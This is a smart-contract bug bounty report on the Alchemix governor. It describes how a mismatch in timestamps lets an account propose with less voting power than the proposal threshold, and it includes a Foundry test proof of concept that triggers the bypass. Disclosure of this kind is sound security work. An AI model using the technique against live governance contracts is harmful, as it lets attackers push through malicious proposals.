# 31277 - \[SC - Insight] The user can propose with less voting power tha...

Submitted on May 16th 2024 at 03:55:34 UTC by @cryptoticky for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31277

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

The user can propose with less voting power than proposalThreshold.

## Vulnerability Details

This error arises from the difference between the timing of calculating votingPower and proposalThreshold.

L2Governor.sol

```
require(
            getVotes(_msgSender(), block.timestamp - 1) >= proposalThreshold(),
            "Governor: veALCX power below proposal threshold"
        );
```

the votingPower is calculated at `block.timestamp - 1`.

but

```
function proposalThreshold() public view override(L2Governor) returns (uint256) {
        return (token.getPastTotalSupply(block.timestamp) * proposalNumerator) / PROPOSAL_DENOMINATOR;
    }
```

`proposalThreshold` is calculated at `block.timestamp` In `block.timestamp`, `VotingEscrow.totalSupplyAtT` becomes smaller than at `block.timestamp - 1` point. If a withdraw occurs at this point, it makes more changes. An attacker may artificially carry out withdraw to make the `VotingEscrow.totalSupplyAtT` smaller. Or the attacker can propose in the same transaction as soon as a user withdraw a large amount.

## Impact Details

By lowering the minimum unit price to create an offer, it makes it easier for an attacker to generate a malicious offer.

## Proof of Concept

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract AlchemixGovernorPoCTest is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);
    }

    function craftTestProposal()
    internal
    view
    returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {
        targets = new address[](1);
        targets[0] = address(voter);
        values = new uint256[](1);
        values[0] = 0;
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(voter.whitelist.selector, usdc);
        description = "Whitelist USDC";
    }

    function testProposePoC1() public {
        uint256 targetTokenId = createVeAlcx(admin, TOKEN_1 * 4 - 5000, MAXTIME, false);
        uint256 userTokenId = createVeAlcx(beef, TOKEN_1 * 96, MAXTIME, false);
        uint256 votingPower = governor.getVotes(admin, block.timestamp);
        uint256 proposalThreshold = governor.proposalThreshold();

        // votingPower < proposalThreshold
        assertLt(votingPower, proposalThreshold, "votingPower >= proposalThreshold");

        hevm.startPrank(admin);

        hevm.warp(block.timestamp + 1);

        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();
        // this call is not failed.
        governor.propose(t, v, c, d, MAINNET);

        hevm.stopPrank();
    }

}
```
